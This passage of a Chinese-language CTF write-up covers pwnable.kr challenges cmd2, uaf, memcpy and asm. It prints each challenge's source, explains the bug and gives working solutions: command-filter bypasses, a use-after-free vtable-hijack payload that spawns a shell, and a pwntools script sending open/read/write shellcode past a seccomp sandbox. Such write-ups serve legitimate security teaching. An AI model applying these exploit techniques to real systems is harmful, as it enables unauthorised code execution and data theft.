-   脑洞大开方式

1.  利用read写入环境变量并执行  
    执行`./cmd2 "read a;\$a"`，输入`/bin/cat flag`得到flag  
    `read a;`写入一个a变量，`\$a`转义`$`字符，执行`$a`变量。
2.  shell内置函数command的参数`-p`

./cmd2 "command -p cat \"f\"l\"a\"g"

  

## uaf

  

### 题目描述

  

Mommy, what is Use After Free bug?

  

#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}

  

### 题目解析

  

这道题目很明显是Use-After-Free(UAF)漏洞，case3中`delete m;delete w`，但是之后再case1中可以再调用`m->introduce();w->introduce();`，触发漏洞。

  

首先了解下C++虚函数

  

虚函数，一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。

  

调试得到`give_shell`地址后就需要想办法调用，这里就利用到UAF

  

但是利用之前需要控制被释放的空间里的内容，case2中有read函数可以利用，但是并不能控制写往什么地址。这里就需要了解下[**fastbin**](https://www.freebuf.com/news/88660.html)

  

fastbin顾名思义，fast就是要快。所以fastbin旨在加快操作系统的内存分配速度，fastbin仅使用fd形成单链表的形式，且遵循LIFO原则。

当操作系统分配一块较小的内存时(64字节)，会首先从从fastbin中寻找未使用的chunk并分配。

  

w，m对象的内存布局为

  

+------------+
|   vtable   |<----------------+
+------------+                 | 
|    age     |        +------------------+
+------------+        | human::give_shell|
|    name    |        +------------------+
+------------+        |  man::introduce  |
      ^               +------------------+
      |
+------------+                 
|   "jack"   |
+------------+

  

大小为24字节，属于fastbin。执行delete之后，如果case2中分配的空间大小为24字节，就可以重新分配到这一块内存区域。

  

**payload**

  

uaf@prowl:~$ python -c 'print "\x48\x15\x40\x00\x00\x00\x00\x00"'>/tmp/uaf_exp1
uaf@prowl:~$ ./uaf 24 /tmp/uaf_exp1
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2          #分配两次，因为程序先delete m,后delete w，只分配一次会先分配到w上面，而case1是先执行m->introduce()。
your data is allocated
1. use
2. after
3. free
1
$ ls
flag  uaf  uaf.cpp
$ cat flag
yay_f1ag_aft3r_pwning

  

## memcpy

  

### 题目描述

  

// compiled with:gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
        asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
	int i;
	for (i=0; i<len; i++) {
		dest[i] = src[i];
	}
	return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
	size_t i;
	// 64-byte block fast copy
	if(len >= 64){
		i = len / 64;
		len &= (64-1);
		while(i-- > 0){
			__asm__ __volatile__ (
			"movdqa (%0), %%xmm0\n"
			"movdqa 16(%0), %%xmm1\n"
			"movdqa 32(%0), %%xmm2\n"
			"movdqa 48(%0), %%xmm3\n"
			"movntps %%xmm0, (%1)\n"
			"movntps %%xmm1, 16(%1)\n"
			"movntps %%xmm2, 32(%1)\n"
			"movntps %%xmm3, 48(%1)\n"
			::"r"(src),"r"(dest):"memory");
			dest += 64;
			src += 64;
		}
	}

	// byte-to-byte slow copy
	if(len) slow_memcpy(dest, src, len);
	return dest;
}

int main(void){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Hey, I have a boring assignment for CS class.. :(\n");
	printf("The assignment is simple.\n");

	printf("-----------------------------------------------------\n");
	printf("- What is the best implementation of memcpy?        -\n");
	printf("- 1. implement your own slow/fast version of memcpy -\n");
	printf("- 2. compare them with various size of data         -\n");
	printf("- 3. conclude your experiment and submit report     -\n");
	printf("-----------------------------------------------------\n");

	printf("This time, just help me out with my experiment and get flag\n");
	printf("No fancy hacking, I promise :D\n");

	unsigned long long t1, t2;
	int e;
	char* src;
	char* dest;
	unsigned int low, high;
	unsigned int size;
	// allocate memory
	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	size_t sizes[10];
	int i=0;

	// setup experiment parameters
	for(e=4; e<14; e++){	// 2^13 = 8K
		low = pow(2,e-1);
		high = pow(2,e);
		printf("specify the memcpy amount between %d ~ %d:", low, high);
		scanf("%d", &size);
		if( size < low || size > high ){
			printf("don't mess with the experiment.\n");
			exit(0);
		}
		sizes[i++] = size;
	}

	sleep(1);
	printf("ok, lets run the experiment with your configuration\n");
	sleep(1);

	// run experiment
	for(i=0; i<10; i++){
		size = sizes[i];
		printf("experiment %d:memcpy with buffer size %d\n", i+1, size);
		dest = malloc( size );

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for slow_memcpy:%llu\n", t2-t1);

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		fast_memcpy(dest, src, size);		// block-to-block memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for fast_memcpy:%llu\n", t2-t1);
		printf("\n");
	}

	printf("thanks for helping my experiment!\n");
	printf("flag:----- erased in this source code -----\n");
	return 0;
}

  

### 题目解析

  

这个程序的作用就是测试自己实现的两个函数`slow_memcpy`和`fast_memcpy`的速度，`slow_memcpy`使用的是逐字节赋值，`fast_memcpy`就比较麻烦了，使用的是内嵌汇编`movdqa`和`movntps`指令，当程序测试完之后就会直接输出flag。

  

直接运行程序，

  

specify the memcpy amount between 8 ~ 16:8
specify the memcpy amount between 16 ~ 32:16
specify the memcpy amount between 32 ~ 64:32
specify the memcpy amount between 64 ~ 128:64
specify the memcpy amount between 128 ~ 256:128
specify the memcpy amount between 256 ~ 512:256
specify the memcpy amount between 512 ~ 1024:512
specify the memcpy amount between 1024 ~ 2048:1024
specify the memcpy amount between 2048 ~ 4096:2048
specify the memcpy amount between 4096 ~ 8192:4096
ok, lets run the experiment with your configuration
experiment 1:memcpy with buffer size 8
ellapsed CPU cycles for slow_memcpy:2162
ellapsed CPU cycles for fast_memcpy:244

experiment 2:memcpy with buffer size 16
ellapsed CPU cycles for slow_memcpy:358
ellapsed CPU cycles for fast_memcpy:254

experiment 3:memcpy with buffer size 32
ellapsed CPU cycles for slow_memcpy:382
ellapsed CPU cycles for fast_memcpy:484

experiment 4:memcpy with buffer size 64
ellapsed CPU cycles for slow_memcpy:618
ellapsed CPU cycles for fast_memcpy:168

experiment 5:memcpy with buffer size 128
ellapsed CPU cycles for slow_memcpy:1250

  

并没有输出flag，而是到某一个环节就停下来了，使用ida调试下，程序在`_mm_stream_ps(a1, (__m128)_mm_load_si128(a2));`，也就是`"movntps %%xmm0, (%1)\n"`的地方出错了，查了下`movntps`，其中有一句描述：

  

When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated.

“如果源或目的操作数是一个内存引用，则它必须满足16字节对齐。否则，会造成一般保护错误。”

  

从源码中可以看到，前三次的赋值操作其实都是由`slow_memcpy`来完成的，所以没有出问题，那么为什么后面的字节就无法对齐

  

首先src是通过`mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);`来得到地址的，这个地址一定是16字节对齐的（[原因](https://stackoverflow.com/questions/42259495/does-mmap-return-aligned-pointer-values)）。而dest则是由malloc来分配的地址，并且malloc返回的地址总是8字节对齐，所以就有可能导致地址不是16字节对齐。

  

但是输入的数据为128时，但是程序还是崩溃了

  

原因在于堆上分配空间时，除了用户的数据，还有4字节的chunk信息，再加上malloc的8字节对齐，所以就无法16字节对齐。

  

那么接下来输入的数据只需要加上8或者12就可以满足16字节对齐。

  

memcpy@prowl:~$ nc 0 9022
Hey, I have a boring assignment for CS class.. :(
The assignment is simple.
-----------------------------------------------------
- What is the best implementation of memcpy?        -
- 1. implement your own slow/fast version of memcpy -
- 2. compare them with various size of data         -
- 3. conclude your experiment and submit report     -
-----------------------------------------------------
This time, just help me out with my experiment and get flag
No fancy hacking, I promise :D
specify the memcpy amount between 8 ~ 16:8
specify the memcpy amount between 16 ~ 32:16
specify the memcpy amount between 32 ~ 64:32
specify the memcpy amount between 64 ~ 128:72
specify the memcpy amount between 128 ~ 256:136
specify the memcpy amount between 256 ~ 512:264
specify the memcpy amount between 512 ~ 1024:520
specify the memcpy amount between 1024 ~ 2048:1032
specify the memcpy amount between 2048 ~ 4096:2056
specify the memcpy amount between 4096 ~ 8192:4104
ok, lets run the experiment with your configuration
experiment 1:memcpy with buffer size 8
ellapsed CPU cycles for slow_memcpy:2120
ellapsed CPU cycles for fast_memcpy:170

experiment 2:memcpy with buffer size 16
ellapsed CPU cycles for slow_memcpy:234
ellapsed CPU cycles for fast_memcpy:208

experiment 3:memcpy with buffer size 32
ellapsed CPU cycles for slow_memcpy:438
ellapsed CPU cycles for fast_memcpy:340

experiment 4:memcpy with buffer size 72
ellapsed CPU cycles for slow_memcpy:600
ellapsed CPU cycles for fast_memcpy:212

experiment 5:memcpy with buffer size 136
ellapsed CPU cycles for slow_memcpy:1208
ellapsed CPU cycles for fast_memcpy:136

experiment 6:memcpy with buffer size 264
ellapsed CPU cycles for slow_memcpy:1684
ellapsed CPU cycles for fast_memcpy:166

experiment 7:memcpy with buffer size 520
ellapsed CPU cycles for slow_memcpy:3700
ellapsed CPU cycles for fast_memcpy:232

experiment 8:memcpy with buffer size 1032
ellapsed CPU cycles for slow_memcpy:7130
ellapsed CPU cycles for fast_memcpy:400

experiment 9:memcpy with buffer size 2056
ellapsed CPU cycles for slow_memcpy:13596
ellapsed CPU cycles for fast_memcpy:774

experiment 10:memcpy with buffer size 4104
ellapsed CPU cycles for slow_memcpy:29864
ellapsed CPU cycles for fast_memcpy:1486

thanks for helping my experiment!
flag:1_w4nn4_br34K_th3_m3m0ry_4lignm3nt

  

## asm

  

### 题目描述

  

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}

  

### 题目解析

  

首先程序分配一块内存区域，然后用0x90将其填充，接着将stub复制进去。

  

其中stub的内容利用pwntools的asm模块翻译过来就是清空所有寄存器

  

>>> print disasm("\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff")
   0:   48                      dec    eax
   1:   31 c0                   xor    eax,eax
   3:   48                      dec    eax
   4:   31 db                   xor    ebx,ebx
   6:   48                      dec    eax
   7:   31 c9                   xor    ecx,ecx
   9:   48                      dec    eax
   a:   31 d2                   xor    edx,edx
   c:   48                      dec    eax
   d:   31 f6                   xor    esi,esi
   f:   48                      dec    eax
  10:   31 ff                   xor    edi,edi
  12:   48                      dec    eax
  13:   31 ed                   xor    ebp,ebp
  15:   4d                      dec    ebp
  16:   31 c0                   xor    eax,eax
  18:   4d                      dec    ebp
  19:   31 c9                   xor    ecx,ecx
  1b:   4d                      dec    ebp
  1c:   31 d2                   xor    edx,edx
  1e:   4d                      dec    ebp
  1f:   31 db                   xor    ebx,ebx
  21:   4d                      dec    ebp
  22:   31 e4                   xor    esp,esp
  24:   4d                      dec    ebp
  25:   31 ed                   xor    ebp,ebp
  27:   4d                      dec    ebp
  28:   31 f6                   xor    esi,esi
  2a:   4d                      dec    ebp
  2b:   31 ff                   xor    edi,edi

  

接着读取用户输入的数据到内存中。

  

重点在这个沙箱函数，通过[seccomp](https://en.wikipedia.org/wiki/Seccomp)建立了一些规则，限制了可以使用的系统调用，只能够使用`read`、`open`、`write`、`exit`、`exit_group`。

  

但有这几个函数就足以构造出shellcode去读取flag，利用pwntools的shellcraft模块和asm模块很轻松就可以完成。

  

汇编语言函数返回值一般是在eax(rax)中，所以open之后read的fd参数填rax

  

from pwn import *

r=ssh('asm','pwnable.kr',2222,'guest')
p=r.connect_remote('localhost',9026)
context(arch='amd64', os='linux')

payload=""
payload=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
payload+=shellcraft.open('rsp',0,0)
payload+=shellcraft.read('rax','rsp',100)
payload+=shellcraft.write(1,'rsp',100)

print p.recvuntil('shellcode: ')

p.sendline(asm(payload))

print p.recvline()

  

后来测试了下，也可以直接open打开

  

payload+=shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')